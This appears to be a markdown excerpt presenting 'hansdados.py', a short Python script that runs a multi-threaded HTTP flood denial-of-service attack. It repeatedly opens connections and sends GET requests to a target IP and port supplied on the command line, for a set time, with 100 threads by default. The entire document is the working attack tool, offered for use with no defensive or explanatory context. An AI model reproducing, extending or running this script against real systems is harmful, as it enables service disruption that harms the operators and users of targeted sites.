## ✅ Main Script: `hansdados.py ` (Short Version)

```python
import socket, threading, argparse, time
from utils.banner import print_banner

def attack(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, port))
        s.send(b"GET / HTTP/1.1\r\nHost: "+ip.encode()+b"\r\n\r\n")
    except:
        pass
    finally:
        s.close()

def start_dos(ip, port, threads, duration):
    print_banner()
    end_time = time.time() + duration
    print(f"[+] Attacking {ip}:{port} with {threads} threads for {duration}s")
    def runner():
        while time.time() < end_time:
            attack(ip, port)
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=runner)
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--ip', required=True)
    parser.add_argument('--port', type=int, required=True)
    parser.add_argument('--threads', type=int, default=100)
    parser.add_argument('--time', type=int, default=60)
    args = parser.parse_args()
    start_dos(args.ip, args.port, args.threads, args.time)
  
